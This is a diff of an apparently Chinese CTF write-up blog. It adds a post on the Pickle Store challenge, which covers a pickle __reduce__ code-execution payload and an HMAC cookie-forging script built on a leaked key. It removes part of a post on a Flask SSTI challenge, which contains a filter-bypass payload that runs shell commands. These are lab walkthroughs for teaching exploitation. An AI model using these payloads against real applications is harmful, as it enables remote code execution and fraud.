@@ -3505,6 +3505,197 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-11-17 17:00:00+00:00">2026-11-17</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="category/python/" class="md-meta__link">Python</a>, 
+              <a href="category/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-meta__link">反序列化</a>, 
+              <a href="category/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="md-meta__link">代码审计</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="watevrctf-2019-pickle-store"><a class="toclink" href="watevrctf2019-pickle-store/">[watevrCTF-2019] Pickle Store — 改完钱还得把签名一起算对</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：Python 反序列化 — pickle session + HMAC 签名伪造</p>
+<p><strong>Flag</strong>：<code>CTF2{eea2f800-cc38-47ee-bc10-05205f709eb8}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="watevrctf2019-pickle-store/#_1">题目概述</a></h3>
+<p>一个卖腌黄瓜的商店。<strong>目标很明确：买下那个 $1000 的 Flag Pickle。</strong></p>
+<p><strong>但初始资金不够。</strong>页面顶上显示 <code>Your funds: $998999</code>（这是改成功之后的样子，初始只有 500）。</p>
+<p>于是问题变成：<strong>怎么让服务器相信我有钱。</strong></p>
+<hr />
+<h3 id="_2"><a class="toclink" href="watevrctf2019-pickle-store/#_2">解题过程</a></h3>
+<h4 id="step-1"><a class="toclink" href="watevrctf2019-pickle-store/#step-1">Step 1：先随便买几个，看看有没有别的反馈</a></h4>
+<p><strong>点了标准腌黄瓜（$10）和 Smörgåsgurka（$100），除了 history 里多两条记录，没有别的反应。</strong></p>
+<p><strong>真正的东西在 cookie 里。</strong></p>
+<h4 id="step-2session-cookie-base64-pickle"><a class="toclink" href="watevrctf2019-pickle-store/#step-2session-cookie-base64-pickle">Step 2：session cookie 是 base64 过的 pickle</a></h4>
+<p><strong>抓包看到一个 <code>session</code> cookie，长得像 base64：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>gAN9cQAoWAAAA...（很长）
+</span></code></pre></div>
+<p><strong>base64 解一次，得到的是二进制——而且开头是 <code>\x80\x04\x95</code>，这是 <strong>pickle 的协议头</strong>。</strong></p>
+<p><strong>Python 的 session 直接把字典 pickle 完再 base64 塞进 cookie，等于把内部对象结构交给客户端保存。</strong></p>
+<h4 id="step-3"><a class="toclink" href="watevrctf2019-pickle-store/#step-3">Step 3：解开看结构</a></h4>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span><span class="o">,</span><span class="w"> </span><span class="nn">base64</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="n">data</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">session_cookie</span><span class="p">))</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></code></pre></div>
+<p><strong>得到一个字典：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="p">{</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>  <span class="s1">'money'</span><span class="p">:</span> <span class="mi">500</span><span class="p">,</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>  <span class="s1">'history'</span><span class="p">:</span> <span class="p">[</span><span class="s1">'Yummy smörgåsgurka'</span><span class="p">,</span> <span class="s1">'Yummy standard pickle'</span><span class="p">],</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>  <span class="s1">'anti_tamper_hmac'</span><span class="p">:</span> <span class="s1">'29ea7e88282f92f4ffc2976f14905697'</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>三个键：钱、购买记录、还有一个防篡改的 HMAC。</strong></p>
+<h4 id="step-4-money"><a class="toclink" href="watevrctf2019-pickle-store/#step-4-money">Step 4：直接改 money —— 失败</a></h4>
+<p><strong>第一反应是 <code>data['money'] = 1000000</code>，重新 pickle + base64，替换 cookie。</strong></p>
+<p><strong>结果页面上钱还是 500。</strong></p>
+<p><strong>原因就是第三个键：<code>anti_tamper_hmac</code>。</strong></p>
+<p><strong>服务端每次收到请求都会</strong>重新算一遍 HMAC<strong>，和你 cookie 里带来的那个比。对不上，就用默认的 <code>money=500</code> 重建 session。</strong></p>
+<p><strong>所以光改值不行，</strong>签名也得跟着对<strong>。</strong></p>
+<h4 id="step-5-pickle"><a class="toclink" href="watevrctf2019-pickle-store/#step-5-pickle">Step 5：顺手试一下 pickle 本身能不能执行代码</a></h4>
+<p><strong>pickle 反序列化的经典利用是 <code>__reduce__</code>：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="k">class</span><span class="w"> </span><span class="nc">evil</span><span class="p">:</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>        <span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,</span> <span class="p">(</span><span class="s2">"__import__('os').system('sleep 5') or 0"</span><span class="p">,))</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">evil</span><span class="p">(),</span> <span class="n">protocol</span><span class="o">=</span><span class="mi">4</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></code></pre></div>
+<p><strong>把 session 换成这个 payload，页面</strong>确实延迟了 5 秒<strong>——说明服务器在反序列化的那一刻就执行了我们的代码。</strong></p>
+<p><strong>接着试了把 <code>ls</code> 的结果写到 <code>static/</code> 目录下，再从浏览器去访问，打不开。</strong>这条路放弃。</p>
+<h4 id="step-6-github"><a class="toclink" href="watevrctf2019-pickle-store/#step-6-github">Step 6：去 GitHub 找源码</a></h4>
+<p><strong>作者把源码开源在 GitHub 上。翻到处理 session 的那段：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">h</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">cookies</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">cookies</span><span class="p">[</span><span class="s2">"anti_tamper_hmac"</span><span class="p">]</span> <span class="o">=</span> <span class="n">h</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="n">resp</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s2">"session"</span><span class="p">,</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">cookies</span><span class="p">)))</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="k">return</span> <span class="n">resp</span>
+</span></code></pre></div>
+<p><strong>然后把 key 也找到了：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"58c93becce9a13c96778ded0edd8096d"</span>
+</span></code></pre></div>
+<p><strong>这里要注意两个细节：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>① HMAC 用的是 md5（源码里 hmac.new(key, digestmod=hashlib.md5)）
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>② 参与计算的是 str(cookies)，而且是在**加入 anti_tamper_hmac 之前**的字典
+</span></code></pre></div>
+<p><strong>也就是说：服务端把你 cookie 里的 <code>money</code> 和 <code>history</code> 拼成 Python 字典的字符串形式，再算 HMAC。</strong></p>
+<p><strong>知道 key，我们就能自己算出一个合法的签名。</strong></p>
+<h4 id="step-7"><a class="toclink" href="watevrctf2019-pickle-store/#step-7">Step 7：本地构造 + 签名 + 替换</a></h4>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">hmac</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"58c93becce9a13c96778ded0edd8096d"</span>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="n">h</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">digestmod</span><span class="o">=</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">)</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="c1"># 注意顺序：和服务器保持一致，先 money 再 history</span>
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"money"</span><span class="p">:</span> <span class="mi">999999</span><span class="p">,</span> <span class="s2">"history"</span><span class="p">:</span> <span class="p">[]}</span>
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">cookies</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>
+</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="c1"># 算完再把签名塞进去</span>
+</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a><span class="n">cookies</span><span class="p">[</span><span class="s2">"anti_tamper_hmac"</span><span class="p">]</span> <span class="o">=</span> <span class="n">h</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a>
+</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">cookies</span><span class="p">,</span> <span class="n">protocol</span><span class="o">=</span><span class="mi">4</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></code></pre></div>
+<p><strong>把这个输出替换掉浏览器的 <code>session</code> cookie，刷新——钱变成了 $998999。</strong></p>
+<p><strong>然后点 Flag Pickle 的 Buy。</strong></p>
+<p><strong>拿到：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>CTF2{eea2f800-cc38-47ee-bc10-05205f709eb8}
+</span></code></pre></div>
+<hr />
+<table>
+<thead>
+<tr>
+<th>关键点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>session 格式</td>
+<td><code>base64(pickle.dumps(dict))</code>，客户端持有完整对象</td>
+</tr>
+<tr>
+<td>防篡改</td>
+<td><code>anti_tamper_hmac</code>，服务端每次重算并比对</td>
+</tr>
+<tr>
+<td>参与签名的内容</td>
+<td><code>str(cookies)</code>，且<strong>不包含</strong> <code>anti_tamper_hmac</code> 自身</td>
+</tr>
+<tr>
+<td>字典顺序</td>
+<td>Python 3.7+ 保持插入顺序，<code>str(dict)</code> 的结果依赖它，<strong>必须和服务器一致</strong></td>
+</tr>
+<tr>
+<td>pickle 可执行</td>
+<td><code>__reduce__</code> 能在反序列化时执行任意代码（sleep 5 验证过）</td>
+</tr>
+<tr>
+<td>最终解法</td>
+<td>源码泄露 key → 自己算 HMAC → 改钱不触发重置</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>完整脚本</summary>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">hmac</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"58c93becce9a13c96778ded0edd8096d"</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="n">h</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">digestmod</span><span class="o">=</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">)</span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"money"</span><span class="p">:</span> <span class="mi">999999</span><span class="p">,</span> <span class="s2">"history"</span><span class="p">:</span> <span class="p">[]}</span>
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">cookies</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="n">cookies</span><span class="p">[</span><span class="s2">"anti_tamper_hmac"</span><span class="p">]</span> <span class="o">=</span> <span class="n">h</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">cookies</span><span class="p">,</span> <span class="n">protocol</span><span class="o">=</span><span class="mi">4</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></code></pre></div>
+</details>
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① 只改 money 不改签名</strong></p>
+<p>服务端会重算 HMAC，对不上就丢弃整个 session，用默认值（money=500）重建。<strong>表现出来就是“我的修改没生效”。</strong></p>
+<p><strong>② 把 <code>anti_tamper_hmac</code> 一起算进签名</strong></p>
+<p>源码里是<strong>先算 HMAC、后插入这个键</strong>。你把带签名的字典再算一遍，结果一定对不上。</p>
+<p><strong>③ 字典顺序变了</strong></p>
+<p><code>str({'history': [], 'money': 999999})</code> 和 <code>str({'money': 999999, 'history': []})</code> 是两个不同的字符串。<strong>键的插入顺序必须和服务器一致。</strong></p>
+<p><strong>④ 以为 pickle RCE 这条路能直接拿 flag</strong></p>
+<p>代码执行确实成立（sleep 5 有效），但 flag 不在磁盘上随便一个位置——它要靠“买”这个业务动作才会显示。<strong>所以还是得回到签名伪造。</strong></p>
+</details>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2026-11-11 21:00:00+00:00">2026-11-11</time></li>
         
           <li class="md-meta__item">
@@ -5658,229 +5849,6 @@
 <p><code>["os"]</code> 前面的那个点是<strong>语法</strong>，不能转义，只能换写法。</p>
 <p><strong>⑤ <code>listdir</code> 给了个文件</strong></p>
 <p>程序把异常吞成 <code>Exception</code>，看不出原因。<strong><code>listdir</code> 要目录，<code>open</code> 要文件。</strong></p>
-</details>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-11-01 18:40:00+00:00">2026-11-01</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="category/python/" class="md-meta__link">Python</a>, 
-              <a href="category/flask/" class="md-meta__link">Flask</a>, 
-              <a href="category/ssti/" class="md-meta__link">SSTI</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 3 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="gyctf2020-flaskapp"><a class="toclink" href="gyctf2020-flaskapp-ssti/">[GYCTF2020] FlaskApp — 一张黑名单，两条链</a></h2>
-<blockquote>
-<p><strong>题目类型</strong>：Web — Flask SSTI（有过滤）</p>
-<p><strong>题目地址</strong>：BUUCTF / ctf2 复刻环境</p>
-<p><strong>Flag</strong>：<code>CTF2{dba20aea-1830-4ecc-b055-b73a1d9ba4fa}</code></p>
-</blockquote>
-<hr />
-<h3 id="_1"><a class="toclink" href="gyctf2020-flaskapp-ssti/#_1">题目概述</a></h3>
-<p>进入靶场发现是一个加解密的方式，先随便加密解密试试。</p>
-<p>这里发现，<strong>解密时会把解密的内容打印出来</strong>——那就有戏了。</p>
-<hr />
-<h3 id="_2"><a class="toclink" href="gyctf2020-flaskapp-ssti/#_2">解题过程</a></h3>
-<h4 id="step-177-nonono"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-177-nonono">Step 1：<code>{{7*7}}</code> 返回 <code>nonono</code></a></h4>
-<p>先试一下 <code>{{7*7}}</code>，返回的是 <code>nonono</code>。</p>
-<p><strong>这个 <code>nonono</code> 就明确了我们的思路是对的，只不过有东西被过滤了。</strong></p>
-<p>接着我去试，发现被过滤的有这些：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>*  eval  os  subprocess  popen  import  system  request  flag
-</span></code></pre></div>
-<p><strong>（是子串匹配、不分大小写。所以 <code>host</code> 这种词也会中招 —— 里面含 <code>os</code>。）</strong></p>
-<p><strong>能过的是：</strong><code>config</code> <code>self</code> <code>session</code> <code>url_for</code> <code>lipsum</code> <code>globals</code> <code>builtins</code> <code>class</code> <code>open</code> <code>cat</code> <code>read</code> <code>+</code></p>
-<p><strong>注意 <code>+</code> 没被过滤</strong>，所以后面全靠拼接绕过。</p>
-<h4 id="step-2-flask"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-2-flask">Step 2：确认是 Flask，先试短路</a></h4>
-<p>试试 <code>{{config}}</code>，出来了 Flask 的配置对象 —— 确认是 Flask（其实题名也提示了）。</p>
-<p>那先试试 <code>url_for</code> 能不能正常使用，结论是可行的：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>{{url_for}}   →  &lt;function url_for at 0x...&gt;
-</span></code></pre></div>
-<h4 id="step-3-net"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-3-net">Step 3：这里我卡住了 —— 页面没回显，Net 里看到重定向</a></h4>
-<p>接着再试 <code>{{url_for.__globals__}}</code>，<strong>但是页面没有回显</strong>，看了一下 Net 发现被重定向了。</p>
-<p><strong>这里我实在不明白原因。</strong>BP 抓包抓下来的响应里，session 里有一大串数据，但是解码不出来。</p>
-<blockquote>
-<p><strong>后来搞明白了，记在这里：</strong></p>
-<p>这题用的是 <strong>POST-Redirect-GET</strong> 模式：</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/decode'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span><span class="s1">'POST'</span><span class="p">])</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">decode</span><span class="p">():</span>
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">'GET'</span><span class="p">:</span>
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>        <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">'res'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'decode.html'</span><span class="p">,</span> <span class="n">res</span><span class="o">=</span><span class="n">res</span><span class="p">)</span>
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>    <span class="k">else</span><span class="p">:</span>
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>        <span class="n">res</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">'text'</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>        <span class="n">session</span><span class="p">[</span><span class="s1">'res'</span><span class="p">]</span> <span class="o">=</span> <span class="n">res</span>          <span class="c1"># 结果塞进 session（flash）</span>
-</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">'/decode'</span><span class="p">)</span>    <span class="c1"># 302</span>
-</span></code></pre></div>
-<p><strong>所以：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>① 你看到的"结果"在重定向之后的 GET 页面里，不在 302 那个响应里
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>② 那一大串 cookie 就是 session —— 结果（可能很长）就装在里面
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>③ 结果越长，cookie 越大
-</span></code></pre></div>
-<p><strong>我看到的"没回显"，其实是在看 302 的响应体（内容是 <code>Redirecting...</code>）。</strong>跟过滤无关，是流程问题。</p>
-</blockquote>
-<h4 id="step-4"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-4">Step 4：短路打通</a></h4>
-<p><code>url_for.__globals__</code> 本身是通的，卡住的是<strong>再往下取 <code>['os']</code></strong> —— 因为 <code>os</code> 在名单里。</p>
-<p><strong>但 <code>+</code> 没被过滤，所以可以拼：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>{{url_for.__globals__['o'+'s']}}
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>→  &lt;module 'os' from '/usr/local/lib/python3.7/os.py'&gt;
-</span></code></pre></div>
-<p>这个又能正常回显了。</p>
-<h4 id="step-5"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-5">Step 5：先找文件名</a></h4>
-<p><code>popen</code> 被拦，所以也拼一下；然后<strong>先 <code>ls /</code></strong>，因为我们还不知道 flag 叫什么：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>{{url_for.__globals__['o'+'s']['p'+'open']('ls /').read()}}
-</span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>app  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>root  run  sbin  srv  sys  this_is_the_flag.txt  tmp  usr  var
-</span></code></pre></div>
-<p><strong>根目录下有个 <code>this_is_the_flag.txt</code>。文件名是这一步才知道的。</strong></p>
-<h4 id="step-6"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-6">Step 6：读出来</a></h4>
-<p>注意 <code>flag</code> 这个词也被拦，所以路径也要拼（<code>'this_is_the_fl'</code> + <code>'ag.txt'</code>）：</p>
